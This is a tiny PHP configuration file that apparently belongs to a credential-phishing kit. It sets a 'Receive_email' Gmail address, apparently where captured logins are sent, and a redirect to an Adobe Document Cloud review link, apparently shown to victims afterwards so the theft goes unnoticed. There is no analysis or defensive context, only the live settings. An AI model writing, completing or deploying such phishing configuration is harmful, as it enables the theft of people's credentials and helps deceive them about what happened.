<?php 
$Receive_email="jg70000014@gmail.com";
$redirect="https://documentcloud.adobe.com/link/review?uri=urn%3Aaaid%3Ascds%3AUS%3Adc592276-42d0-48b4-98ab-637f3aedd0cb";
?>